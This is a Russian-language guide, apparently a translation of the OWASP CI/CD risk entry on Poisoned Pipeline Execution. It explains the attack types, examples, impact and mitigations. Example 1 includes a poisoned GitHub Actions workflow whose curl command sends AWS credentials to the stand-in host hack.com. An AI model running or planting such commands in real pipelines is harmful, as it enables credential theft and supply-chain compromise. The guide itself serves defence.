# CICD-SEC-4: Выполнение зараженного конвейера (PPE)
## Определение

Под рисками Poisoned Pipeline Execution (PPE) понимается возможность злоумышленника, имеющего доступ к системам контроля исходных текстов и не имеющего доступа к среде сборки, манипулировать процессом сборки путем внедрения вредоносного кода/команд в конфигурацию конвейера сборки, по сути, "отравляя" конвейер и запуская вредоносный код как часть процесса сборки.

## Описание

Вектор PPE злоупотребляет правами доступа к SCM-репозиторию таким образом, что заставляет CI-конвейер выполнять вредоносные команды.

Пользователи, имеющие права на работу с конфигурационными файлами CI или другими файлами, на которые опирается задание CI-конвейера, могут модифицировать их таким образом, чтобы они содержали вредоносные команды, что в конечном итоге "отравляет" CI-конвейер, выполняющий эти команды.

Конвейеры, выполняющие непросмотренный код, например, запускаемые непосредственно на основе запросов на выгрузку или коммитов в произвольные ветви репозитория, более подвержены PPE. Причина в том, что такие сценарии по своей природе содержат код, не прошедший никаких проверок и согласований.

Получив возможность выполнить вредоносный код в CI-конвейере, злоумышленник может выполнить широкий спектр вредоносных операций, причем все они будут осуществляться в контексте идентификации конвейера.

Существует три типа PPE:

**Прямое PPE** (D-PPE): В сценарии D-PPE злоумышленник изменяет файл конфигурации CI в репозитории, к которому у него есть доступ, либо путем прямого переноса изменений в незащищенную удаленную ветку репозитория, либо путем отправки PR с изменениями из ветки или форка. Поскольку конвейер CI запускается по событиям "push" или "PR", а его выполнение определяется командами в измененном конфигурационном файле CI, вредоносные команды злоумышленника в конечном итоге выполняются на узле сборки после запуска конвейера сборки.

**Косвенное PPE** (I-PPE): В некоторых случаях возможность D-PPE недоступна злоумышленнику, имеющему доступ к SCM-репозиторию:

- Если конвейер настроен на извлечение файла конфигурации CI из отдельной защищенной ветки в том же репозитории.
- Если файл конфигурации CI хранится в отдельном от исходного кода репозитории, без возможности его прямого редактирования пользователем.
- Если сборка CI определяется в самой системе CI, а не в файле, хранящемся в исходном коде.

В этом случае злоумышленник все равно может отравить конвейер, внедрив вредоносный код, например, в файлы, на которые ссылается конфигурационный файл конвейера:

- *make*: Выполняет команды, определенные в файле "Makefile".
- *Скрипты*, на которые ссылается файл конфигурации конвейера и которые хранятся в том же репозитории, что и сам исходный код (например, python myscript.py - где myscript.py будет подвергнут манипуляциям со стороны злоумышленника).
- *Тесты кода*: Фреймворки тестирования, работающие с кодом приложения в процессе сборки, используют специальные файлы, хранящиеся в том же репозитории, что и сам исходный код. Злоумышленники, которым удастся манипулировать кодом, отвечающим за тестирование, смогут выполнять вредоносные команды внутри сборки.
- *Автоматические инструменты*: Линтеры и сканеры безопасности, используемые в CI, также обычно зависят от конфигурационного файла, находящегося в репозитории. Часто эти конфигурации предполагают загрузку и выполнение внешнего кода из места, определенного в конфигурационном файле.
    Поэтому вместо того, чтобы отравлять конвейер, вставляя вредоносные команды непосредственно в файл определения конвейера, в I-PPE злоумышленник внедряет вредоносный код в файлы, на которые ссылается конфигурационный файл. В конечном итоге вредоносный код выполняется на узле трубопровода после его срабатывания и запускает команды, объявленные в соответствующих файлах.

**Public-PPE** (3PE): Для реализации атаки PPE требуется доступ к хранилищу, в котором находится конфигурационный файл трубопровода, или к файлам, на которые он ссылается. В большинстве случаев разрешение на это дается членам организации - в основном инженерам. Поэтому для осуществления прямой или косвенной атаки PPE злоумышленники, как правило, должны обладать правами инженера на доступ к хранилищу.

Однако в некоторых случаях отравление конвейеров CI доступно анонимным злоумышленникам в Интернете: Публичные репозитории (например, проекты с открытым исходным кодом) часто позволяют любому пользователю вносить свой вклад - обычно путем создания pull request'ов, предлагая изменения в коде. Такие проекты обычно автоматически тестируются и собираются с помощью CI-решений, аналогично частным проектам.

Если в CI-конвейер публичного репозитория запускается непроверенный код, предложенный анонимными пользователями, он становится уязвимым для атаки Public PPE, или сокращенно - 3PE. Это также приводит к раскрытию внутренних активов, например секретов частных проектов, в тех случаях, когда конвейер уязвимого публичного репозитория работает на том же экземпляре CI, что и частные проекты.

## Примеры

<ins>Пример 1: Кража учетных данных через Direct-PPE (GitHub Actions)</ins>

В следующем примере репозиторий GitHub связан с рабочим процессом GitHub Actions, который получает код, собирает его, выполняет тесты и в конечном итоге деплоит артефакты на AWS.

Когда в удаленную ветку репозитория выкладывается новый код, он, включая файл конфигурации конвейера, извлекается исполнителем (узлом рабочего процесса).

```yaml
name: PIPELINE
on: push
jobs:
 build:
   runs-on: ubuntu-latest
   steps:
     - run: |
         echo "building..."
         echo "testing..."
         echo "deploying..."
```

![ee587e136d9fd170ede42cfd65d55ffc.png](../../_resources/ee587e136d9fd170ede42cfd65d55ffc.png)
В этом сценарии атака D-PPE будет осуществляться следующим образом:
Злоумышленник создает в репозитории новую удаленную ветку, в которой обновляет файл конфигурации конвейера с помощью вредоносных команд, предназначенных для получения доступа к учетным данным AWS, привязанным к организации GitHub, и последующей их отправки на удаленный сервер.

```yaml
name: PIPELINE
on: push
jobs:
 build:
   runs-on: ubuntu-latest
   steps:
     - env:
         ACCESS_KEY: $
         SECRET_KEY: $

       run: |
         curl -d creds="$(echo $ACCESS_KEY:$SECRET_KEY | base64 | base64)" hack.com
```

1.  После отправки обновления запускается конвейер, который извлекает код из репозитория, включая вредоносный конфигурационный файл конвейера.
2.  Конвейер запускается на основе конфигурационного файла, "зараженного" злоумышленником. В соответствии с вредоносными командами злоумышленника в память загружаются учетные данные AWS, хранящиеся как секреты хранилища.
3.  Конвейер приступает к выполнению команд злоумышленника, которые отправляют учетные данные AWS на сервер, контролируемый злоумышленником.
4.  После этого злоумышленник может использовать украденные учетные данные для доступа к производственной среде AWS.

<ins>Пример 2: кража учетных данных через Indirect-PPE (Jenkins)</ins>

На этот раз речь идет о конвейере Jenkins, который получает код из репозитория, собирает его, проводит тесты и в итоге деплоит на AWS. В этом сценарии конфигурация конвейера такова, что файл, описывающий конвейер, - Jenkinsfile - всегда берется из основной ветки репозитория, которая защищена. Таким образом, злоумышленник не может манипулировать определением сборки, а значит, не может получить секреты, хранящиеся в хранилище учетных данных Jenkins, или запустить задание на других узлах.

Однако это не означает, что конвейер свободен от рисков;

На этапе сборки конвейера учетные данные AWS загружаются как переменные окружения, что делает их доступными только для команд, выполняемых на этом этапе. В приведенном ниже примере в рамках этого этапа выполняется команда make, основанная на содержимом Makefile (также хранящегося в репозитории).

Jenkinsfile:

```
pipeline {
   agent any
   stages {
       stage('build') {
           steps {
               withAWS(credentials: 'AWS_key', region: 'us-east-1') {
                       sh 'make build'
                       sh 'make clean'
               }
           }
       }
       stage('test') {
           steps {
               sh 'go test -v ./...'
...
```

Makefile:

```makefile
build:
   echo "building…"

clean:
   echo "cleaning…"
```

1. Поскольку конвейер настроен на срабатывание при любом PR по отношению к репозиторию, запускается конвейер Jenkins, который получает код из репозитория, включая вредоносный Makefile.
2. Конвейер запускается на основе конфигурационного файла, хранящегося в основной ветке. На этапе сборки он загружает учетные данные AWS в переменные окружения, заданные в исходном Jenkinsfile. Затем запускается команда make build, которая выполняет вредоносную команду, добавленную в Makefile.
3. Вредоносная функция сборки, определенная в Makefile, выполняется, отправляя учетные данные AWS на сервер, контролируемый злоумышленником.
4. После этого злоумышленник может использовать украденные учетные данные для доступа к производственной среде AWS.

## Влияние
При успешной атаке PPE злоумышленники выполняют в CI вредоносный непросмотренный код. При этом злоумышленник получает те же возможности и уровень доступа, что и задание сборки, включая:

- Доступ к любым секретам, доступным для задания CI, например, к секретам, внедренным в качестве переменных окружения, или к дополнительным секретам, хранящимся в CI. Отвечая за сборку кода и развертывание артефактов, CI/CD-системы обычно содержат десятки важных учетных данных и токенов - например, для облачного провайдера, реестров артефактов и самой SCM.
- Доступ к внешним ресурсам, на которые имеет права узел задания, например, к файлам, хранящимся в файловой системе узла, или к облачной среде, доступной через базовый узел.
- Возможность отправки кода и артефактов дальше по конвейеру под видом легитимного кода, созданного процессом сборки.
- Возможность доступа к дополнительным узлам и ресурсам в сети/окружении узла задания.
## Рекомендации
Предотвращение и ослабление вектора атаки PPE включает в себя множество мер, охватывающих как SCM, так и CI-системы:

- [ ] Убедиться, что конвейеры с непросмотренным кодом выполняются на изолированных узлах, не подверженных воздействию секретных и чувствительных сред.
- [ ] Оценить необходимость запуска конвейеров на публичных репозиториях от внешних авторов. По возможности воздержитесь от запуска конвейеров, созданных на основе форков, и рассмотрите возможность добавления таких средств контроля, как требование ручного одобрения выполнения конвейера.
- [ ] Для чувствительных конвейеров, например, тех, которые содержат секреты, убедитесь, что для каждой ветки, настроенной на запуск конвейера в системе CI, в SCM существует соответствующее правило защиты ветки.
- [ ] Чтобы предотвратить манипуляции с конфигурационным файлом CI для запуска вредоносного кода в конвейере, каждый конфигурационный файл CI должен быть просмотрен перед запуском конвейера. В качестве альтернативы файл конфигурации CI может управляться в удаленной ветке, отдельной от ветки, содержащей код, собираемый в конвейере. Удаленная ветка должна быть сконфигурирована как защищенная.
- [ ] Снимите разрешения на доступ к репозиторию SCM с пользователей, которым они не нужны.
- [ ] Каждый конвейер должен иметь доступ только к тем учетным данным, которые необходимы ему для выполнения поставленной задачи. Учетные данные должны иметь минимально необходимые привилегии.

## Ссылки
1. Эксплуатация систем непрерывной интеграции и автоматизированной сборки, DEF CON 25, доклад Тайлера Велтона (Tyler Welton). В докладе рассматривались методы эксплуатации векторов атак Direct-PPE и 3PE, направленных на конвейеры, выполняющие непросмотренный код.
https://www.youtube.com/watch?v=mpUDqo7tIk8
 
2. PPE - Poisoned Pipeline Execution. Запуск вредоносного кода в вашем CI без доступа к нему. Авторы: Даниэль Кривелевич и Омер Гил.
https://www.cidersecurity.io/blog/research/ppe-poisoned-pipeline-execution/

3. Безопасность конвейера сборки, автор xssfox. В конвейере CodeBuild на сайте, принадлежащем AWS, обнаружена уязвимость Indirect-PPE. Это позволяло анонимным злоумышленникам модифицировать скрипт, выполняемый файлом конфигурации сборки при создании запроса на извлечение, что приводило к компрометации учетных данных развертывания.
https://sprocketfox.io/xssfox/2021/02/18/pipeline/
 
4. GitHub Actions злоупотреблял майнингом криптовалюты с помощью pull request'ов, содержащих вредоносный код.
https://dev.to/thibaultduponchelle/the-github-action-mining-attack-through-pull-request-2lmc
 
5. Провайдер terraform для выполнения команд ОС во время запуска плана terraform в конвейере, автор Hiroki Suezawa.
https://github.com/rung/terraform-provider-cmdexec
 
6. Злоупотребление командой terraform plan для выполнения команд ОС в CI/CD, автор Alex Kaskasoli.
https://alex.kaskaso.li/post/terraform-plan-rce
 
7. Обнаружена уязвимость в реализации CI Teleport, позволяющая злоумышленникам из Интернета осуществить атаку Direct-3PE, создав запрос на посылку в публичный репозиторий GitHub, связанный с CI-конвейером Drone, и изменив конфигурационный файл CI для выполнения вредоносного конвейера.
https://goteleport.com/blog/hack-via-pull-request/
 
8. Исследование Асьера Ривера Фернандеса показало, как может быть осуществлена PPE-атака на среду CI/CD, включающую сервисы CodePipeline, CodeBuild и CodeDeploy в AWS.
https://www.youtube.com/watch?v=McZBcMRxPTA https://www.pwc.be/en/FY21/documents/AWS%20CI_CD%20technical%20article%20-%20v3.pdf
